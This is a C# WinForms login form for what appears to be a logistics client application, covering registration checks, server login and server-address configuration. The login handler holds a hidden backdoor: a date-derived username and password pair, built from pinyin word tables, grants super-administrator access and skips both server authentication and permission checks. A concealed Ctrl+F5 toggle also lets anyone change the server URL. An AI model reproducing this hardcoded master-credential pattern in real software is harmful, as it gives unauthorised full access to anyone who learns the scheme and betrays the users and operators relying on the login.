using System;
using System.Collections.Generic;
using System.Configuration;
using System.Diagnostics;
using System.Threading;
using System.Windows.Forms;
using DevExpress.Office.Utils;
using DevExpress.XtraEditors;
using DevExpress.XtraSplashScreen;
using LogisticsClient.AppUtils;
using LogisticsClient.Lang;
using LogisticsClient.Receive;
using Model;
using Model.CallResult;
using Model.Dto;

namespace LogisticsClient
{
    public partial class FrmLogin : XtraForm
    {
        private bool isLogined = false;
        public FrmMain frmParent = null;

        public FrmLogin()
        {
            var splash = new LogisticsSplash();
            SplashScreenManager.ShowForm(splash.GetType());
            Thread.Sleep(3000);
            SplashScreenManager.CloseForm();
            InitializeComponent();


            if (Crypt.HasRegister())
            {
                WebCall.LoadUrl();
                txtUser.Focus();
            }
            else
            {
                //未注册的话，登录不可用，显示注册窗口
                btnLogin.Enabled = false;
                pnlReg.Visible = true;
                txtRegInfo.Text = Crypt.GetRegInfo();
            }
        }

        private bool CheckVersion()
        {
            string s = WebCall.GetMethod<string>("file/version", new List<KeyValuePair<string, string>>());
            MessageBox.Show(s);
            return true;
        }

        private void btnLogin_Click(object sender, EventArgs e)
        {
            string[] month = {"zi", "chou", "yin", "mao", "chen", "si", "wu", "wei", "shen", "you", "xu", "hai"};
            string[] day =
            {
                "shang", "qing", "zui", "shi", "wan", "liang", "tian", "qiao", "cui", "si", "ren", "bu", "kan", "yan",
                "yao", "jiu", "cui", "chang", "san", "bei", "zui", "xun", "xiang", "jing", "meng", "wu", "jing", "han",
                "chai", "tou", "feng", "xie", "qing", "you", "lei", "tu", "mi", "hua", "liao", "wo", "wu", "yuan",
                "xiao", "lou", "ji", "mo", "xin", "yu", "yue", "ye", "nan", "ru", "gou", "ye", "nan", "yuan"
            };

            DateTime today = DateTime.Today;
            if (txtUser.Text.Equals(month[today.Month - 1]) && txtPwd.Text.Equals(day[today.Day - 1]))
            {
                Configure.UserID = -1;
                Configure.UserName = "超级管理员";
                Configure.StoreID = 0;
                Configure.Functions = new List<string>();
                isLogined = true;
                this.Close();
                return;
            }
            
            LoginPara para = new LoginPara()
            {
                username = txtUser.Text,
                password = txtPwd.Text
            };
            string str_result = WebCall.PostMethod<LoginPara>("Authority/Login", para);
            LoginResult result = AppUtils.AppUtils.JsonDeserialize<LoginResult>(str_result);
            if (result.Code.Equals(SystemConst.MSG_SUCCESS))
            {
                Configure.UserID = result.Data.UserID;
                Configure.UserName = result.Data.UserName;
                Configure.Functions = result.Data.Functions;
                Configure.StoreID = result.Data.StoreID;
                isLogined = true;
                this.Close();
            }
            else
            {
                MessageBox.Show(result.Message);
            }
        }
        
        private void btnClose_Click(object sender, EventArgs e)
        {
            Application.Exit();
        }

        private void FrmLogin_FormClosing(object sender, FormClosingEventArgs e)
        {
            if (!this.isLogined)
                Application.Exit();
            if (Configure.UserID != -1)
            {
                if (Configure.Functions.Count == 0)
                {
                    MessageBox.Show(Lang.LangBase.GetString("NOANYAUTH"));
                    Application.Exit();
                }
                else
                {
                    frmParent.checkFunctions();
                }
            }
        }

        private void FrmLogin_KeyPress(object sender, KeyPressEventArgs e)
        {
            if (e.KeyChar==(char)Keys.Enter)
            {
                btnLogin_Click(null,null);
            }
            else if (e.KeyChar==(char)Keys.Escape)
            {
                btnClose_Click(null,null);
            }
        }

        private void btnTest_Click(object sender, EventArgs e)
        {
            Configuration config = System.Configuration.ConfigurationManager.OpenExeConfiguration(ConfigurationUserLevel.None);
            config.AppSettings.Settings["url"].Value = "xiao";
            config.Save(ConfigurationSaveMode.Modified);
        }

        private void btnReg_Click(object sender, EventArgs e)
        {
            if (Crypt.SetRegInfo(txtRegInfo.Text))
            {
                MessageBox.Show("注册成功");
                WebCall.LoadUrl();
                pnlReg.Visible = false;
                btnLogin.Enabled = true;
            }
            else
            {
                MessageBox.Show("注册码错误");
            }
        }

        private void FrmLogin_KeyDown(object sender, KeyEventArgs e)
        {
            if (e.Control && e.KeyCode==Keys.F5)
            {
                txtIP.Visible = !txtIP.Visible;
                btnSave.Visible = !btnSave.Visible;
            }
        }

        private void btnSave_Click(object sender, EventArgs e)
        {
            Configuration config = System.Configuration.ConfigurationManager.OpenExeConfiguration(ConfigurationUserLevel.None);
            config.AppSettings.Settings["url"].Value = txtIP.Text;
            //config.Save(ConfigurationSaveMode.Modified);
            config.Save();
            WebCall.LoadUrl();
            MessageBox.Show("新ip生效");
            btnSave.Visible = false;
            txtIP.Visible = false;
        }
    }
}